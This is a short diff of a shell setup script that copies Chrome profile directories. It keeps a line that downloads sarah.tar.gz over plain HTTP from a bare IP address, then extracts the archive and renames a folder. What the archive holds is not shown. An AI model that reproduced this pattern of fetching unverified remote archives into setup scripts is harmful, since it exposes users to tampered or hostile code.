@@ -69,9 +69,9 @@ cp -r chrome chrome4
 #cp -r chrome /home/12
 #wget https://raw.githubusercontent.com/mazbron/x/master/every.tar.gz
 #tar -xvf every.tar.gz
-cd
 wget http://173.212.241.46/sarah.tar.gz
-tar -xvf sarah.tar.gz
+tar -xvf sarah.tar.gz && mv chrome sarah
+
 sleep 2
 cd
 mkdir Desktop
